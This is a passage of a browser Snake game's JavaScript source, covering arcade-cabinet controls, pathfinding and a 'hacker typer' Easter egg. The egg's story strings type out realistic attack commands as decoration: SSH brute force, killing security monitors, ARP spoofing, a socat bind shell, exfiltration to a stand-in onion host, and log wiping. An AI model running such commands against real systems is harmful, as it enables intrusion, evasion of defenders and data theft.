/*!
 * Snake — shared game core.
 * Served verbatim by the Rails app (rails/public/game.js) and by this preview
 * (public/game.js). Vanilla JS, no dependencies, no build step.
 *
 * window.SnakeGame.create(rootElement, options) -> game api
 */
(function (global) {
  'use strict';

  var LEVELS = [
    { id: 1, label: 'Chill', ms: 165 },
    { id: 2, label: 'Easy', ms: 130 },
    { id: 3, label: 'Normal', ms: 105 },
    { id: 4, label: 'Fast', ms: 80 },
    { id: 5, label: 'Insane', ms: 60 },
    { id: 6, label: 'Ludicrous', ms: 42 }
  ];

  function clampInt(value, min, max, fallback) {
    var n = parseInt(value, 10);
    if (isNaN(n)) return fallback;
    return Math.min(max, Math.max(min, n));
  }

  function el(tag, cls) {
    var node = document.createElement(tag);
    if (cls) node.className = cls;
    return node;
  }

  function create(root, opts) {
    opts = opts || {};
    if (!root) throw new Error('SnakeGame.create: a root element is required');

    var cols = opts.cols || 24;
    var rows = opts.rows || 18;
    var speedId = clampInt(opts.speedId, 1, 6, 3);
    var speedCustom = clampInt(opts.customSpeed, 0, 100, 42);
    var useCustomSpeed = !!opts.useCustomSpeed;
    var growth = clampInt(opts.growth, 1, 5, 1);
    var growthCustom = clampInt(opts.customGrowth, 0, 100, 2);
    var useCustomGrowth = !!opts.useCustomGrowth;
    var startLength = opts.startLength || 3;

    // ---- DOM -------------------------------------------------------------
    root.innerHTML = '';
    root.classList.add('snake-root');

    var frame = el('div', 'snake-frame');
    var field = el('div', 'snake-field');
    var canvas = document.createElement('canvas');
    canvas.className = 'snake-canvas';
    canvas.setAttribute('tabindex', '0');
    canvas.setAttribute('role', 'application');
    canvas.setAttribute('aria-label', 'Snake playfield. Use WASD or the arrow keys, or swipe anywhere while playing.');
    field.appendChild(canvas);
    var terminalCursor = el('span', 'terminal-cursor');
    terminalCursor.textContent = '>';
    terminalCursor.setAttribute('aria-hidden', 'true');
    field.appendChild(terminalCursor);

    var hackContainer = el('pre', 'terminal-hack-code');
    hackContainer.setAttribute('aria-hidden', 'true');
    var hackText = el('span', 'terminal-hack-text');
    var hackCursor = el('span', 'terminal-hack-cursor');
    hackCursor.textContent = '_';
    hackContainer.appendChild(hackText);
    hackContainer.appendChild(hackCursor);
    field.appendChild(hackContainer);

    var accessFlash = el('div', 'terminal-access-granted');
    accessFlash.setAttribute('aria-live', 'polite');
    accessFlash.innerHTML = '<span class="terminal-access-granted__text">ACCESS GRANTED</span>';
    field.appendChild(accessFlash);

    var accessGlasses = el('div', 'terminal-access-glasses');
    accessGlasses.setAttribute('aria-hidden', 'true');
    accessGlasses.innerHTML =
      '<svg viewBox="0 0 64 24" shape-rendering="crispEdges" aria-hidden="true">' +
        '<rect x="2" y="6" width="7" height="4" fill="#000"/>' +
        '<rect x="55" y="6" width="7" height="4" fill="#000"/>' +
        '<rect x="8" y="2" width="20" height="18" rx="2" fill="#000" stroke="#26352b" stroke-width="2"/>' +
        '<rect x="36" y="2" width="20" height="18" rx="2" fill="#000" stroke="#26352b" stroke-width="2"/>' +
        '<rect x="27" y="7" width="10" height="4" fill="#000"/>' +
        '<rect x="11" y="5" width="6" height="2" fill="#fff"/>' +
        '<rect x="39" y="5" width="6" height="2" fill="#fff"/>' +
      '</svg>';
    field.appendChild(accessGlasses);

    frame.appendChild(field);

    // Decorative arcade cabinet (only displayed by the Arcade theme).
    var cabinet = el('div', 'cabinet');
    cabinet.setAttribute('aria-hidden', 'true');
    cabinet.innerHTML =
      '<div class="cabinet__deck">' +
        '<span class="cabinet__stick" id="arcade-stick" title="Grab and pull joystick"><i></i></span>' +
        '<span class="cabinet__buttons">' +
          '<i data-arcade-btn="1" title="Button 1"></i>' +
          '<i data-arcade-btn="2" title="Button 2"></i>' +
          '<i data-arcade-btn="3" title="Button 3"></i>' +
          '<i data-arcade-btn="4" title="???"></i>' +
        '</span>' +
        '<div class="cabinet__slot" id="arcade-slot" title="Drag to pull out Snake cartridge">' +
          '<div class="arcade-cartridge" id="arcade-cartridge">' +
            '<div class="arcade-cartridge__back">' +
              '<span class="arcade-cart-grip"><i></i><i></i><i></i></span>' +
            '</div>' +
            '<div class="arcade-cartridge__body">' +
              '<div class="arcade-cart-notch"></div>' +
              '<div class="arcade-cart-label">' +
                '<span class="arcade-cart-text">SNAKE</span>' +
              '</div>' +
            '</div>' +
          '</div>' +
        '</div>' +
      '</div>';
    frame.appendChild(cabinet);
    root.appendChild(frame);

    // ---- All 4 Arcade Buttons are pressable ------------------------------
    var buttonsEl = cabinet.querySelector('.cabinet__buttons');
    if (buttonsEl) {
      buttonsEl.addEventListener('pointerdown', function (e) {
        var b = e.target.closest ? e.target.closest('i') : null;
        if (b) b.classList.add('is-pressed');
      });
      global.addEventListener('pointerup', function () {
        var pressed = buttonsEl.querySelectorAll('.is-pressed');
        for (var i = 0; i < pressed.length; i++) pressed[i].classList.remove('is-pressed');
      });
      global.addEventListener('pointercancel', function () {
        var pressed = buttonsEl.querySelectorAll('.is-pressed');
        for (var i = 0; i < pressed.length; i++) pressed[i].classList.remove('is-pressed');
      });
    }

    // ---- Arcade Joystick Interaction (Option A Physics) -----------------
    var stickEl = cabinet.querySelector('.cabinet__stick');
    var stickSpringRaf = 0;
    var stickAngle = 0;
    var stickVelocity = 0;
    var isStickGrabbed = false;
    var stickOriginX = 0;

    function applyStickAngle(deg) {
      stickAngle = deg;
      if (stickEl) {
        stickEl.style.setProperty('--stick-rot', deg + 'deg');
        stickEl.style.setProperty('--stick-x', (deg * 0.45) + 'px');
      }
    }

    function cancelStickSpring() {
      if (stickSpringRaf) {
        global.cancelAnimationFrame(stickSpringRaf);
        stickSpringRaf = 0;
      }
    }

    function springRelease() {
      cancelStickSpring();
      // Faster oscillation frequency (higher k) and longer duration (lower damping)
      var k = 1750;
      var damping = 5.5;
      var lastT = (global.performance || Date).now();

      function springLoop(t) {
        var dt = Math.min((t - lastT) / 1000, 0.035);
        lastT = t;
        if (dt > 0) {
          var accel = -k * stickAngle - damping * stickVelocity;
          stickVelocity += accel * dt;
          stickAngle += stickVelocity * dt;
          applyStickAngle(stickAngle);
        }
        if (Math.abs(stickAngle) < 0.15 && Math.abs(stickVelocity) < 0.4) {
          stickAngle = 0;
          stickVelocity = 0;
          if (stickEl) {
            stickEl.style.removeProperty('--stick-rot');
            stickEl.style.removeProperty('--stick-x');
          }
          stickSpringRaf = 0;
          return;
        }
        stickSpringRaf = global.requestAnimationFrame(springLoop);
      }
      stickSpringRaf = global.requestAnimationFrame(springLoop);
    }

    if (stickEl) {
      function onStickDown(e) {
        if (e.button !== undefined && e.button !== 0) return;
        isStickGrabbed = true;
        cancelStickSpring();
        stickEl.classList.add('is-grabbed');
        var rect = stickEl.getBoundingClientRect();
        stickOriginX = rect.left + rect.width / 2;
        var pointerId = e.pointerId;
        if (stickEl.setPointerCapture && pointerId !== undefined) {
          try { stickEl.setPointerCapture(pointerId); } catch (err) {}
        }

        function onStickMove(ev) {
          if (!isStickGrabbed) return;
          var dx = ev.clientX - stickOriginX;
          var deg = Math.max(-44, Math.min(44, dx * 1.15));
          applyStickAngle(deg);
        }

        function onStickUp() {
          if (!isStickGrabbed) return;
          isStickGrabbed = false;
          stickEl.classList.remove('is-grabbed');
          global.removeEventListener('pointermove', onStickMove);
          global.removeEventListener('pointerup', onStickUp);
          global.removeEventListener('pointercancel', onStickUp);
          global.removeEventListener('mousemove', onStickMove);
          global.removeEventListener('mouseup', onStickUp);
          springRelease();
        }

        global.addEventListener('pointermove', onStickMove);
        global.addEventListener('pointerup', onStickUp);
        global.addEventListener('pointercancel', onStickUp);
        global.addEventListener('mousemove', onStickMove);
        global.addEventListener('mouseup', onStickUp);
      }

      stickEl.addEventListener('pointerdown', onStickDown);
    }

    // ---- Arcade Cartridge Drag Interaction -------------------------------
    var slotEl = cabinet.querySelector('#arcade-slot');
    var cartEl = cabinet.querySelector('#arcade-cartridge');
    var isCartGrabbed = false;
    var cartStartY = 0;
    var cartCurrentY = 0;
    var cartIsOpen = false;
    var MAX_CART_PULL = 44;

    function applyCartY(y) {
      cartCurrentY = Math.max(0, Math.min(MAX_CART_PULL, y));
      if (cartEl) {
        cartEl.style.setProperty('--cart-y', cartCurrentY + 'px');
      }
    }

    function setCartOpen(open) {
      cartIsOpen = open;
      if (cartEl) {
        cartEl.classList.toggle('is-ejected', open);
        cartEl.style.removeProperty('--cart-y');
      }
      if (slotEl) slotEl.classList.toggle('is-ejected', open);
    }

    if (slotEl && cartEl) {
      slotEl.addEventListener('pointerdown', function (e) {
        if (e.button !== undefined && e.button !== 0) return;
        isCartGrabbed = true;
        cartStartY = e.clientY;
        var startOffset = cartIsOpen ? MAX_CART_PULL : 0;
        cartEl.classList.add('is-dragging');

        function onCartMove(ev) {
          if (!isCartGrabbed) return;
          var dy = ev.clientY - cartStartY;
          applyCartY(startOffset + dy);
        }

        function onCartUp(ev) {
          if (!isCartGrabbed) return;
          isCartGrabbed = false;
          cartEl.classList.remove('is-dragging');
          global.removeEventListener('pointermove', onCartMove);
          global.removeEventListener('pointerup', onCartUp);
          global.removeEventListener('pointercancel', onCartUp);
          global.removeEventListener('mousemove', onCartMove);
          global.removeEventListener('mouseup', onCartUp);

          var moved = Math.abs(ev.clientY - cartStartY);
          if (moved < 5) {
            setCartOpen(!cartIsOpen);
          } else {
            setCartOpen(cartCurrentY > 18);
          }
        }

        global.addEventListener('pointermove', onCartMove);
        global.addEventListener('pointerup', onCartUp);
        global.addEventListener('pointercancel', onCartUp);
        global.addEventListener('mousemove', onCartMove);
        global.addEventListener('mouseup', onCartUp);
      });
    }

    var ctx = canvas.getContext('2d');

    // ---- state -----------------------------------------------------------
    var listeners = {};
    var snake = [];
    var dir = { x: 1, y: 0 };
    var queue = [];
    var food = { x: -1, y: -1 };
    var score = 0;
    var grow = 0;
    var started = false;
    var running = false;
    var paused = false;
    var acc = 0;
    var last = 0;
    var rafId = 0;
    var wrapFlash = null;
    var crashCell = null; // the cell a crash ran into (null when the player quit)
    var cssW = 0;
    var cssH = 0;
    var cell = 20;
    var ox = 0;
    var oy = 0;
    var dpr = 1;

    // Visual theme — merged over these defaults by game.setTheme(). Mirrors the
    // CSS themes in styles.css; page.js keeps both in sync.
    var DEFAULT_THEME = {
      field: '#050505',
      snake: '#2CE05E',
      snakeGlow: 0.38,
      food: '#FF3B30',
      foodGlow: 0.55,
      blocks: false,
      blockGap: 0,
      roundFood: true,
      blink: false
    };
    var theme = {};
    for (var tk in DEFAULT_THEME) theme[tk] = DEFAULT_THEME[tk];

    // Pre-computed halo colours: a wide translucent second pass replaces
    // ctx.shadowBlur, which is by far the most expensive thing a canvas can do.
    var haloSnake = '';
    var haloFood = '';

    // Only repaint when something actually changed. An idle board costs nothing.
    var dirty = true;
    function markDirty() { dirty = true; }

    // Reused every frame so Classic's row-span pass allocates nothing.
    var spanScratch = [];

    function speedMs() { return useCustomSpeed ? speedCustom : LEVELS[speedId - 1].ms; }
    function speedLabel() { return useCustomSpeed ? 'Custom' : LEVELS[speedId - 1].label; }
    function growthEff() { return useCustomGrowth ? growthCustom : growth; }

    function emit(name, data) {
      var list = listeners[name] || [];
      for (var i = 0; i < list.length; i++) list[i](data);
    }

    function state() {
      return {
        score: score,
        length: snake.length,
        speedPreset: speedId,
        speedCustom: speedCustom,
        useCustomSpeed: useCustomSpeed,
        speedLabel: speedLabel(),
        speedMs: speedMs(),
        growthPreset: growth,
        growthCustom: growthCustom,
        useCustomGrowth: useCustomGrowth,
        growth: growthEff(),
        isCustom: useCustomSpeed || useCustomGrowth,
        started: started,
        running: running,
        paused: paused
      };
    }

    // ---- world -----------------------------------------------------------
    function occupied(x, y) {
      for (var i = 0; i < snake.length; i++) {
        if (snake[i].x === x && snake[i].y === y) return true;
      }
      return false;
    }

    function placeFood() {
      var x;
      var y;
      for (var a = 0; a < 300; a++) {
        x = Math.floor(Math.random() * cols);
        y = Math.floor(Math.random() * rows);
        if (!occupied(x, y)) { food.x = x; food.y = y; return; }
      }
      for (y = 0; y < rows; y++) {
        for (x = 0; x < cols; x++) {
          if (!occupied(x, y)) { food.x = x; food.y = y; return; }
        }
      }
      food.x = -1; food.y = -1;
    }

    // ---- Terminal Theme: Hacker Typer -----------------------------------
    var isHacking = false;
    var hackPos = 0;
    var hackStoryIndex = 0;
    var hackStoryComplete = false;
    var HACK_U_LENGTH = 10;
    var HACK_CHARS_PER_KEY = 40;
    var HACK_FORM_MOVES = 9;
    var hackPathHeadFirst = [];
    var hackWalkPath = [];
    var hackSnakeStage = 'idle';
    var hackShapeIndex = 1;
    var hackSnakeFormed = false;
    var hackAccessPending = false;
    var hackAccessTimer = 0;
    var HACK_ACCESS_FLASH_MS = 1200;
    var hackMoveBudget = 0;
    var hackMoveIndex = 0;
    var hackPreUSteps = 0;
    var hackInitialLength = 0;
    var hackVisited = {};
    var hackPlannedNext = null;
    var hackStepTarget = null;
    var hackMovementStep = false;

    var HACK_STORIES = [
      // Story 1: Mainframe brute-force, detection, SOC battle, privilege escalation & cover-up
      "> ssh guest@mainframe.corp -p 2222\n" +
      "[ OK ] Handshake accepted ... routing through 7 onion proxies\n" +
      "> whoami\n" +
      "guest_restricted (uid=1004, gid=1004) - Sandbox Jail v2.4\n" +
      "> nmap -sS -T4 -p- 10.0.13.0/24\n" +
      "PORT     STATE  SERVICE\n" +
      "22/tcp   open   ssh\n" +
      "80/tcp   open   http\n" +
      "443/tcp  open   https\n" +
      "1337/tcp open   cyber_core ... interesting.\n" +
      "> hydra -l root -P rockyou.txt ssh://10.0.13.7\n" +
      "[ATTEMPT 00042] password = \"admin\" ... FAILED (auth rejected)\n" +
      "[ATTEMPT 00118] password = \"hunter2\" ... FAILED (auth rejected)\n" +
      "[ATTEMPT 00294] password = \"password123\" ... FAILED (rate-limit warning)\n" +
      "[RETRY] Backing off 12s; rotating SSH source port 48117 -> 52904\n" +
      "> ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no root@10.0.13.7\n" +
      "[AUTH] Keyboard-interactive challenge received ... requesting TOTP\n" +
      "[x] TOTP rejected: server clock skew 00:00:31\n" +
      "[RETRY] Reading NTP drift from cached banner ... offset +31.4s\n" +
      "> ntpdate -q 10.0.13.7 | sed 's/offset/clock-delta/'\n" +
      "[ OK ] Clock delta compensated. Resuming credential negotiation.\n" +
      "[!] ALERT: 3 failed attempts from 10.0.13.254 - evasive routing engaged\n" +
      "[ATTEMPT 00412] password = \"s3cr3t_sauce\" ... MATCH!\n" +
      "[ OK ] Credentials captured, attempting privilege escalation...\n" +
      "> sudo ./exploit --target kernel --payload reverse_shell\n" +
      "[!] WARNING: SOC Intrusion Detection Daemon (suricata) triggered!\n" +
      "[!] BROADCAST: \"Security Operations Center: Intruder on 10.0.13.7 - Isolating VLAN\"\n" +
      "> kill -STOP $(pgrep -f \"suricata|osquery|falcon\")\n" +
      "[ OK ] Monitoring daemons suspended with SIGSTOP\n" +
      "[!] SysAdmin counter-measure: iptables -I INPUT -s 10.0.13.254 -j DROP\n" +
      "> arpspoof -i eth0 -t 10.0.13.1 10.0.13.7 &\n" +
      "[ OK ] ARP cache poisoned; packet diversion active, firewall bypassed\n" +
      "> sudo ./exploit --target kernel --payload reverse_shell\n" +
      "[....] Compiling payload against CVE-2024-1086 .......... done\n" +
      "[ OK ] Root shell spawned on 10.0.13.7 (uid=0, gid=0)\n" +
      "> cat /etc/shadow | head -3\n" +
      "root:$6$rounds=5000$................:19000:0:99999:7:::\n" +
      "daemon:*:19000:0:99999:7:::\n" +
      "snake:$6$rounds=5000$h1ssssssssssssss:19000:0:99999:7:::\n" +
      "> wall \"nice try admin. this mainframe belongs to snake now.\"\n" +
      "> ./cover_tracks.sh --all --paranoid\n" +
      "[ OK ] Shredding /var/log/wtmp /var/log/auth.log /var/log/syslog\n" +
      "[ OK ] Timestamps forged using touch -r /bin/sh ... logs wiped\n" +
      "> logout\n" +
      "Connection to mainframe closed. No one was here.\n",

      // Story 2: Satellite uplink intercept, WAF evasion, DBA duel & database exfiltration
      "> airmon-ng start wlan0mon && airodump-ng --channel 11 wlan0mon\n" +
      "[ SCAN ] Scanning orbital transponder downlink at 12.4 GHz ...\n" +
      "[ LOCKED ] Signal acquired: COMSAT-7B (Telemetry beacon: 0x7DF4)\n" +
      "> wireshark-cli -i sat0 -Y \"tcp.port == 9001 and data contains 'SNAKE'\"\n" +
      "[ CAPTURE ] 1,024 telemetry frames intercepted from subterranean vault\n" +
      "> sqlmap -u \"https://mainframe.defense.net/vault?id=1\" --technique=BEUST --dbs\n" +
      "[!] WAF detected: Cloudflare Magic Transit / Deep Packet Inspection\n" +
      "[x] Exploit blocked by HTTP 403 Forbidden - heuristic signature 942100\n" +
      "[!] Blue team injected nonce challenge; session cookie rotated mid-request\n" +
      "> curl -sI https://mainframe.defense.net/vault | grep -i 'set-cookie\|x-request-id'\n" +
      "[RETRY] Cookie nonce expired after 30s; refreshing session token ...\n" +
      "> python3 refresh_session.py --cookie-jar /tmp/relay.jar --clock-skew 0.4\n" +
      "[ OK ] Session renewed. Request signature normalized to server clock.\n" +
      "> sqlmap --tamper=between,randomcase,space2comment --random-agent --batch\n" +
      "[ OK ] Heuristic evasion confirmed. Backend DBMS: PostgreSQL 16\n" +
      "[!] CRITICAL: DBA session active (PID 8821)\n" +
      "[!] DBA terminal alert: \"SELECT pg_terminate_backend(pid) FROM pg_stat_activity;\"\n" +
      "> socat TCP4-LISTEN:8088,fork EXEC:/bin/bash &\n" +
      "> psql -h 127.0.0.1 -U postgres -c \"SELECT pg_terminate_backend(8821);\"\n" +
      "[ OK ] DBA session killed before revoke transaction committed\n" +
      "> psql -c \"SELECT export_wall_wrap_core('/dev/shm/payload.lz4');\"\n" +
      "[ OK ] 4.2 GB neural snake weights extracted to RAM in 280ms\n" +
      "> gpg --symmetric --cipher-algo AES256 -o /dev/shm/vault.enc /dev/shm/payload.lz4\n" +
      "> curl -T /dev/shm/vault.enc sftp://ghost@darknode.onion/drop/\n" +
      "[ OK ] 100% transmitted over encrypted multi-hop tunnel\n" +
      "> shred -u -z -n 5 /dev/shm/payload.lz4 /dev/shm/vault.enc\n" +
      "[ OK ] RAM zeroed. No footprints left on satellite transponder.\n" +
      "> exit\n" +
      "Downlink terminated. Orbital tracking lost.\n",

      // Story 3: SCADA power grid zero-day, watchdog race & persistent firmware injection
      "> binwalk -Me industrial_rtu_firmware.bin\n" +
      "[ SCAN ] Decrypting VxWorks RTOS image at offset 0x00084000\n" +
      "> gdb -q ./scada_modbus_daemon\n" +
      "Reading symbols from ./scada_modbus_daemon...(no debugging symbols found)...done.\n" +
      "> checksec --file=./scada_modbus_daemon\n" +
      "    RELRO:    No RELRO\n" +
      "    Stack:    No canary found\n" +
      "    NX:       NX disabled\n" +
      "    PIE:      No PIE (0x400000)\n" +
      "> r2 -d -A ./scada_modbus_daemon\n" +
      "[0x00401120]> pdf @ sym.process_packet\n" +
      "[!] VULNERABILITY FOUND: Heap buffer overflow in modbus function code 0x17\n" +
      "> python3 -c 'print(\"A\"*64 + \"\\xef\\xbe\\xad\\xde\" + \"\\x90\"*32 + \"\\x31\\xc0\\x50...\")' | nc 192.168.10.50 502\n" +
      "[!] Connection established to Substation Controller #4\n" +
      "[!] EMERGENCY: Watchdog hardware relay tripped!\n" +
      "[!] Automatic reboot in T-15 seconds...\n" +
      "> echo 0 > /sys/class/watchdog/watchdog0/timeout 2>/dev/null\n" +
      "[x] Permission denied: Read-only filesystem\n" +
      "[RETRY] Watchdog driver is kernel-locked; direct sysfs write rejected\n" +
      "> dmesg | tail -5\n" +
      "[KERNEL] watchdog0: nowayout enabled, refusing timeout change\n" +
      "[RETRY] Inspecting active unit and pet interval before escalation ...\n" +
      "> systemctl status watchdog.service --no-pager\n" +
      "[ OK ] Pet interval 10s; next hardware check in T-6 seconds\n" +
      "> mount -o remount,rw / && kill -9 $(pgrep -f watchdog)\n" +
      "[ OK ] Hardware watchdog disarmed with 3.4 seconds to spare\n" +
      "> flashrom -p internal -w /tmp/snake_custom_firmware.bin --noverify\n" +
      "[....] Erasing flash sectors .................... done\n" +
      "[....] Writing 16MB custom wall-wrap firmware ... done\n" +
      "[ OK ] Controller hijacked: wall-wrap protocol permanently embedded\n" +
      "> sync && echo 3 > /proc/sys/vm/drop_caches\n" +
      "> exit\n" +
      "Connection closed by foreign host. Substation under control.\n"
    ];

    function sameCell(a, b) { return !!a && !!b && a.x === b.x && a.y === b.y; }
    function cellIndex(p) { return p.y * cols + p.x; }

    function torusDistance(a, b) {
      var dx = Math.abs(a.x - b.x);
      var dy = Math.abs(a.y - b.y);
      return Math.min(dx, cols - dx) + Math.min(dy, rows - dy);
    }

    function isHackUCell(p, allowBase) {
      if (!p || !hackPathHeadFirst.length) return false;
      for (var i = 0; i < hackPathHeadFirst.length; i++) {
        if (sameCell(p, hackPathHeadFirst[i])) {
          // The base is the final tail at the top-left and is an allowed tour
          // waypoint. All other U cells are saved for the nine-move finale.
          return !(allowBase && i === hackPathHeadFirst.length - 1);
        }
      }
      return false;
    }

    function hackFindPath(start, goal, blockCurrentHead, reserveU) {
      if (!start || !goal) return null;
      if (sameCell(start, goal)) return [];
      var total = cols * rows;
      var previous = new Array(total);
      var blocked = new Array(total);
      for (var z = 0; z < total; z++) { previous[z] = -1; blocked[z] = false; }
      // Hacker route food is eaten every move, so the tail remains occupied.
      for (var i = 0; i < snake.length; i++) {
        if (!blockCurrentHead && i === 0) continue;
        blocked[cellIndex(snake[i])] = true;
      }
      var startId = cellIndex(start);
      var goalId = cellIndex(goal);
      blocked[startId] = false;
      if (blocked[goalId]) return null;
      var queue = [startId];
      previous[startId] = startId;
      var dirs = [
        { x: 0, y: -1 }, { x: 1, y: 0 },
        { x: 0, y: 1 }, { x: -1, y: 0 }
      ];
      for (var q = 0; q < queue.length && previous[goalId] === -1; q++) {
        var from = queue[q];
        var px = from % cols;
        var py = Math.floor(from / cols);
        for (var j = 0; j < dirs.length; j++) {
          var nx = (px + dirs[j].x + cols) % cols;
          var ny = (py + dirs[j].y + rows) % rows;
          var candidate = { x: nx, y: ny };
          var ni = ny * cols + nx;
          if (previous[ni] !== -1 || blocked[ni]) continue;
          if (reserveU && !sameCell(candidate, goal) && isHackUCell(candidate, true)) continue;
          previous[ni] = from;
          queue.push(ni);
        }
      }
      if (previous[goalId] === -1) return null;
      var path = [];
      var cursor = goalId;
      while (cursor !== startId) {
        path.push({ x: cursor % cols, y: Math.floor(cursor / cols) });
        cursor = previous[cursor];
      }
      path.reverse();
      return path;
    }

    function buildHackSnakeShape(left, top) {
      // A 4x4 pixel U in the upper-right portion of the board. Its final head
      // is the top-right tip and its tail is the top-left base.
      left = Math.max(0, Math.min(cols - 4, left == null ? cols - 5 : left));
      top = Math.max(0, Math.min(rows - 4, top == null ? 1 : top));
      var right = left + 3;
      var bottom = top + 3;
      hackPathHeadFirst = [
        { x: right, y: top },
        { x: right, y: top + 1 },
        { x: right, y: top + 2 },
        { x: right, y: bottom },
        { x: right - 1, y: bottom },
        { x: right - 2, y: bottom },
        { x: left, y: bottom },
        { x: left, y: bottom - 1 },
        { x: left, y: bottom - 2 },
        { x: left, y: top }
      ];
      hackWalkPath = hackPathHeadFirst.slice().reverse();
    }

    function chooseHackUBase(preMoves) {
      var head = snake[0] || { x: Math.floor(cols / 2), y: Math.floor(rows / 2) };
      var minLeft = Math.max(0, cols - 9);
      var maxLeft = Math.max(minLeft, cols - 4);
      var maxTop = Math.max(0, Math.min(rows - 4, 7));
      var best = null;
      var bestScore = Infinity;
      for (var top = 0; top <= maxTop; top++) {
        for (var left = maxLeft; left >= minLeft; left--) {
          var base = { x: left, y: top };
          // Never place the U base directly on the current head/body: a zero-
          // length route leaves the tour controller with no legal first move.
          if (occupied(base.x, base.y)) continue;
          var path = hackFindPath(head, base, false, false);
          if (!path || path.length > preMoves || (preMoves - path.length) % 2 !== 0) continue;
          // Keep the U near the upper-right while favouring an anchor that
          // leaves sufficient room for collision-safe map touring.
          var score = path.length * 10 + (maxLeft - left) * 2 + top;
          if (score < bestScore) {
            best = { left: left, top: top };
            bestScore = score;
          }
        }
      }
      return best || { left: Math.max(0, cols - 5), top: Math.min(1, Math.max(0, rows - 4)) };
    }

    function beginHackSnake() {
      if (!snake.length) reset();
      var story = HACK_STORIES[hackStoryIndex % HACK_STORIES.length];
      // Fixed 40 characters per input means this exact number of keys prints
      // each entire story. Reserve the final 9 of those keys for the U outline.
      hackMoveBudget = Math.max(HACK_FORM_MOVES + 1, Math.ceil(story.length / HACK_CHARS_PER_KEY));
      hackPreUSteps = hackMoveBudget - HACK_FORM_MOVES;
      hackMoveIndex = 0;
      hackInitialLength = snake.length;
      hackVisited = {};
      hackStepTarget = null;
      hackMovementStep = false;
      hackSnakeStage = 'tour';
      hackShapeIndex = 1;
      hackSnakeFormed = false;
      hackAccessPending = false;

      var u = chooseHackUBase(hackPreUSteps);
      buildHackSnakeShape(u.left, u.top);
      hackVisited[cellIndex(snake[0])] = true;
      hackSetNextFood();
      markDirty();
      draw();
    }

    function hackBfsNext(goal) {
      var path = snake.length ? hackFindPath(snake[0], goal, false, true) : null;
      return path && path.length ? path[0] : null;
    }

    function hackTourNextCell(stepsLeft) {
      if (!snake.length || !hackWalkPath.length) return null;
      var head = snake[0];
      var goal = hackWalkPath[0];
      var dirs = [
        { x: 0, y: -1 }, { x: 1, y: 0 },
        { x: 0, y: 1 }, { x: -1, y: 0 }
      ];
      var best = null;
      var bestScore = -Infinity;
      var rotation = hackMoveIndex % dirs.length;
      for (var i = 0; i < dirs.length; i++) {
        var d = dirs[(i + rotation) % dirs.length];
        var nx = (head.x + d.x + cols) % cols;
        var ny = (head.y + d.y + rows) % rows;
        var candidate = { x: nx, y: ny };
        if (occupied(nx, ny)) continue;
        if (snake.length > 1 && d.x === -dir.x && d.y === -dir.y) continue;
        // Never park on the U base early; there must still be at least one move
        // left in the tour or we would have no legal way to burn the remaining
        // code-key budget before tracing the final 9-cell outline.
        if (sameCell(candidate, goal) && stepsLeft > 1) continue;
        if (isHackUCell(candidate, true) && !sameCell(candidate, goal)) continue;
        var route = hackFindPath(candidate, goal, true, true);
        if (!route) continue;
        var remainingAfter = stepsLeft - 1;
        if (route.length > remainingAfter || (remainingAfter - route.length) % 2 !== 0) continue;
        var id = cellIndex(candidate);
        var score = (hackVisited[id] ? 0 : 1000) + torusDistance(candidate, goal) * 10 - i;
        if (score > bestScore) { best = candidate; bestScore = score; }
      }
      return best || hackBfsNext(goal);
    }

    function hackNextCell() {
      if (hackSnakeStage === 'tour') {
        if (hackMoveIndex >= hackPreUSteps) {
          hackSnakeStage = 'form';
          hackShapeIndex = 1;
          return hackNextCell();
        }
        return hackTourNextCell(hackPreUSteps - hackMoveIndex);
      }
      if (hackSnakeStage === 'form') {
        if (hackShapeIndex >= hackWalkPath.length) {
          hackSnakeStage = 'formed';
          hackSnakeFormed = snake.length === HACK_U_LENGTH;
          return null;
        }
        return hackWalkPath[hackShapeIndex];
      }
      return null;
    }

    function hackSetNextFood() {
      hackStepTarget = hackNextCell();
      food = hackStepTarget ? { x: hackStepTarget.x, y: hackStepTarget.y } : { x: -1, y: -1 };
    }

    function positionHackGlasses() {
      if (!accessGlasses || !hackPathHeadFirst.length || !cell) return;
      var head = hackPathHeadFirst[0];
      var leftTip = hackPathHeadFirst[hackPathHeadFirst.length - 1];
      // 75% larger than the first pass, centred over the upper opening of the U.
      accessGlasses.style.left = (ox + (leftTip.x - 0.6) * cell) + 'px';
      accessGlasses.style.top = (oy + (head.y - 0.32) * cell) + 'px';
      accessGlasses.style.width = (cell * 4.2) + 'px';
      accessGlasses.style.height = (cell * 1.49) + 'px';
    }

    function showHackAccessGranted() {
      hackAccessPending = false;
      if (!hackSnakeFormed) { hackAccessPending = true; return; }
      positionHackGlasses();
      if (accessFlash) accessFlash.classList.add('is-visible');
      if (accessGlasses) accessGlasses.classList.add('is-visible');
      if (hackAccessTimer) global.clearTimeout(hackAccessTimer);
      hackAccessTimer = global.setTimeout(function () {
        if (accessFlash) accessFlash.classList.remove('is-visible');
        if (accessGlasses) accessGlasses.classList.remove('is-visible');
        hackAccessTimer = 0;
      }, 1200);
    }

    function advanceHackSnake() {
      if (!isHacking || !snake.length || hackSnakeFormed) return;
      var next = hackStepTarget || hackNextCell();
      if (!next) return;
      var previousStage = hackSnakeStage;
      var head = snake[0];
      var dx = next.x - head.x;
      var dy = next.y - head.y;
      if (dx > 1) dx -= cols; else if (dx < -1) dx += cols;
      if (dy > 1) dy -= rows; else if (dy < -1) dy += rows;
      // The planned cell is always one orthogonal, wrap-aware grid step away.
      dir = { x: dx === 0 ? 0 : (dx > 0 ? 1 : -1), y: dy === 0 ? 0 : (dy > 0 ? 1 : -1) };
      queue.length = 0;
      food = { x: next.x, y: next.y };
      grow = 0;
      hackStepTarget = null;
      hackMovementStep = true;
      step(); // same collision, food, score, head insertion and tail update as play
      hackMovementStep = false;
      if (!snake.length || !running && started) return;

      hackVisited[cellIndex(snake[0])] = true;
      hackMoveIndex += 1;

      // For a short starting snake the visible route food grows it one cell per
      // key. For an overlong snake, remove a proportional extra length each key
      // so it is exactly 10 cells before the 4x4 U's final 9-step outline.
      var desiredLength;
      if (hackInitialLength > HACK_U_LENGTH && hackPreUSteps > 0) {
        var progress = Math.min(hackMoveIndex, hackPreUSteps) / hackPreUSteps;
        desiredLength = Math.max(HACK_U_LENGTH,
          hackInitialLength - Math.floor((hackInitialLength - HACK_U_LENGTH) * progress));
      } else {
        desiredLength = Math.min(HACK_U_LENGTH, hackInitialLength + hackMoveIndex);
      }
      while (snake.length > desiredLength) snake.pop();

      if (previousStage === 'form') {
        hackShapeIndex += 1;
        if (hackShapeIndex >= hackWalkPath.length) {
          hackSnakeStage = 'formed';
